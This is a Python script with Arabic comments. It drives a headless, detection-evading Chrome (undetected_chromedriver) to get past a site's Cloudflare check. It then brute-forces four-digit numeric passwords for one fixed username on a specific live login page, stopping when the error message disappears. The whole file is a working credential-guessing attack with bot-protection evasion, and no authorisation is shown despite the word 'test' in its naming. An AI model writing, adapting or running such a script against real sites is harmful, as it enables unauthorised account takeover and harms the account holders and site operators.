import time
import os
# !! تحديث مهم: استيراد المكتبة الجديدة !!
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# --- إعدادات الاختبار (تبقى كما هي) ---
TARGET_URL = "https://menhel-ndb-2.online"
USERNAME = "33772020"
PASSWORD_START = 500
PASSWORD_END = 9999
ERROR_MESSAGE = "خطأ في تسجيل الدخول" 

# --- وظيفة الاختبار الرئيسية ---
def run_brute_force_test():
    driver = None
    print("--- بدء تشغيل السكربت باستخدام Undetected Chromedriver ---")
    try:
        # !! تحديث مهم: طريقة جديدة لتهيئة المتصفح !!
        options = uc.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        
        # تحديد مسار المتصفح الذي قمنا بتثبيته
        chrome_path = os.path.join(os.getcwd(), "deps", "chrome-linux64", "chrome")
        options.binary_location = chrome_path
        
        print("1. تهيئة متصفح Chrome المتخفي...")
        # استخدام uc.Chrome بدلاً من webdriver.Chrome
        driver = uc.Chrome(options=options, use_subprocess=True)
        
        print(f"2. التوجه إلى الموقع: {TARGET_URL}")
        driver.get(TARGET_URL)
        
        print("3. الانتظار لمدة 20 ثانية (لإعطاء وقت لـ Cloudflare)...")
        time.sleep(20) # زدنا مدة الانتظار لإعطاء فرصة لصفحة التحقق أن تمر

        try:
            WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "auths"))
            )
            print("4. تم تجاوز الحماية والعثور على حقل اسم المستخدم بنجاح!")
        except TimeoutException:
            print("!!! فشل التحقق الأولي حتى مع المتصفح المتخفي !!!")
            print("لم يتم العثور على حقل اسم المستخدم. قد تكون الحماية قوية جدًا.")
            # حفظ لقطة شاشة للمساعدة في تصحيح الأخطاء
            driver.save_screenshot('debug_screenshot.png')
            print("تم حفظ لقطة شاشة باسم debug_screenshot.png")
            return

        # --- بقية الكود (حلقة تجربة كلمات المرور) تبقى كما هي تمامًا ---
        print("5. بدء تجربة كلمات المرور...")
        for i in range(PASSWORD_START, PASSWORD_END + 1):
            password = str(i).zfill(4)
            
            try:
                username_field = driver.find_element(By.NAME, "auths") 
                password_field = driver.find_element(By.NAME, "password")
                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                
                username_field.clear()
                username_field.send_keys(USERNAME)
                password_field.clear()
                password_field.send_keys(password)
                
                login_button.click()
                print(f"   - تجربة كلمة المرور: {password}")
                
                time.sleep(3) 
                
                if ERROR_MESSAGE not in driver.page_source:
                    print(f"\n*** نجاح! تم تسجيل الدخول بكلمة المرور: {password} ***")
                    break 
                
            except Exception as e:
                print(f"حدث خطأ غير متوقع أثناء المحاولة {password}: {e}")
                break
                
    except Exception as e:
        print(f"حدث خطأ فادح في تشغيل المتصفح: {e}")
    finally:
        if driver:
            driver.quit()
            print("--- تم إغلاق المتصفح وإنهاء السكربت ---")

if __name__ == "__main__":
    run_brute_force_test()
